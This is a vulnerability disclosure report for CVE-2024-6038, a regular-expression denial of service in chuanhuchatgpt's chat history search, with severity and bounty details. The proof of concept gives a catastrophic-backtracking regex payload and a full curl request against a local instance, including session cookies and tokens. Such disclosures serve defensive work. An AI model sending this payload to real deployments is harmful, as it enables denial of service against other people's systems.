Title: ReDoS Vulnerability in Chat History Filtering via Regular Expression Injection in gaizhenbiao/chuanhuchatgpt

Proof of Concept: 
Add a chat history entry named "ACCCCCCCCCCCCCCCCCCCCCCCCCCCCCE" .
Use the regex payload "A(B|C+)+D" to search through the chat history, the response time exceeds 20 seconds.
Incrementally add more characters 'C' of the chat history entry name(e.g., "ACCCCCCCCCCCCCCCCCCCCCCCCCCCCCCE", "ACCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCE", etc.). With each addition, the response time increase dramatically.
The curl poc:

curl "http://127.0.0.1:7860/queue/join?" ^
  -H "Accept: */*" ^
  -H "Accept-Language: zh-CN,zh;q=0.9" ^
  -H "Cache-Control: no-cache" ^
  -H "Connection: keep-alive" ^
  -H "Content-Type: application/json" ^
  -H "Cookie: b-user-id=8d279e75-c77a-6a2c-425d-219ea8d9c185; _ga=GA1.1.1219011971.1715018562; _gid=GA1.1.1618133523.1715113606; access-token-lNpTiXdaaxXwflTSmV9K_1kS1HmJpUnSOrZJcZOm6vY=T2Z7Gn_v3ohKkDXkwFqePg; access-token-unsecure-lNpTiXdaaxXwflTSmV9K_1kS1HmJpUnSOrZJcZOm6vY=T2Z7Gn_v3ohKkDXkwFqePg; access-token-pooSZAOJ07Ja4rkteZ7RyhE9ayzVtrbBnsHt_IotBQA=KJqifAmgtBLe0L2eQcVLig; access-token-unsecure-pooSZAOJ07Ja4rkteZ7RyhE9ayzVtrbBnsHt_IotBQA=KJqifAmgtBLe0L2eQcVLig; _ga_R1FN4KJKJH=GS1.1.1715315230.12.1.1715315533.0.0.0" ^
  -H "Origin: http://127.0.0.1:7860" ^
  -H "Pragma: no-cache" ^
  -H "Referer: http://127.0.0.1:7860/" ^
  -H "Sec-Fetch-Dest: empty" ^
  -H "Sec-Fetch-Mode: cors" ^
  -H "Sec-Fetch-Site: same-origin" ^
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" ^
  -H ^"sec-ch-ua: ^\^"Google Chrome^\^";v=^\^"123^\^", ^\^"Not:A-Brand^\^";v=^\^"8^\^", ^\^"Chromium^\^";v=^\^"123^\^"^" ^
  -H "sec-ch-ua-mobile: ?0" ^
  -H ^"sec-ch-ua-platform: ^\^"Windows^\^"^" ^
  --data-raw ^"^{^\^"data^\^":^[^\^"nobody^\^",^\^"A(B^|C+)+D^\^"^],^\^"event_data^\^":null,^\^"fn_index^\^":45,^\^"trigger_id^\^":20,^\^"session_hash^\^":^\^"jo95ucrf7qj^\^"^}^"

Impact: 
This ReDoS vulnerability can lead to severe degradation of service performance and potential system unavailability.

CVE ID: CVE-2024-6038
Status: (published)
Vulnerability Type: CWE-625: Permissive Regular Expression
Severity: High (7.5)
Attack Vector: Network
Attack Complexity: Low
Privileges Required: None
User Interaction: None
Scope: Unchanged
Confidentiality: None
Integrity: None
Availability: High
Registry: Pypi
Affected Version: latest
Visibility: Public
Status: Awaiting fix
Disclosure Bounty: $450
Fix Bounty: $112.5
